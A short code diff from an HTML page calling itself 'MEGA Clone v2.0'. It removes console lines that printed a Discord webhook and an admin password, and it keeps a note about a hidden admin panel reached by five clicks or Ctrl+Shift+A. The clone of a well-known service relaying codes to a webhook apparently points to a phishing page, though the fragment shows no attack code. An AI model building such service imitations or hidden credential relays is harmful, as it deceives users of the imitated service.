-        console.log('🔐 MEGA Clone v2.0 - Kod 2-cyfrowy (LIVE między oknami)');
-        console.log('📡 Discord Webhook:', CONFIG.DISCORD_WEBHOOK);
-        console.log('🔑 Admin password:', CONFIG.ADMIN_PASSWORD);
+        console.log('🔐 MEGA Clone v2.0 - Kod pojawia się LIVE na ekranie użytkownika (API)');
         console.log('ℹ️ Kliknij 5x w ⚙️ lub Ctrl+Shift+A');
     </script>
 </body>
